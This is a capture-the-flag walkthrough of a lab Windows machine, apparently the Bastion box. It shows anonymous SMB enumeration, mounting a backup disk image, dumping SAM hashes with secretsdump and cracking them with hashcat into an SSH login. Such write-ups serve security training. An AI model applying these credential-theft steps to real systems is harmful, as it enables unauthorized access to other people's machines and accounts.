We find a null session in SMB

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L //10.10.10.134

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~]
└─$ smbclient -N //10.10.10.134/Backups 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 16 12:02:11 2019
  ..                                  D        0  Tue Apr 16 12:02:11 2019
  note.txt                           AR      116  Tue Apr 16 12:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 13:44:02 2019
```

We access to the folder WindowsImageBackup and we found a backup called `L4mpje-PC`. Mount the drive in our system

```bash
┌──(kali㉿kali)-[/]
└─$ mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
```

Now we can access to the files in our filesystem. Here we find two vhd files, which are disk image files. We tried to mount both but only was mounted successfully

```bash
┌──(kali㉿kali)-[/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─$ sudo guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/

┌──(kali㉿kali)-[/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─$ sudo su

┌──(root㉿kali)-[/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─# cd /mnt2

┌──(root㉿kali)-[/mnt2]
└─# ls
'$Recycle.Bin'   config.sys                pagefile.sys   ProgramData      Recovery                     Users
 autoexec.bat   'Documents and Settings'   PerfLogs      'Program Files'  'System Volume Information'   Windows
 ```

In the folder Windows/System32/config we have the files SAM and SYSTEM, files needed to dump the user hash

```bash
┌──(root㉿kali)-[/mnt2/Windows/System32/config]
└─# /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

With hashcat we found a valid credentials

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Bastion-10.10.10.134]
└─$ sudo hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

[...SNIP...]

31d6cfe0d16ae931b73c59d7e0c089c0:                         
26112010952d963c8dc4217daec986d9:bureaulampje             
                                                          
[...SNIP...]
```

So we have L4mpje:bureaulampje credentials and works for SSH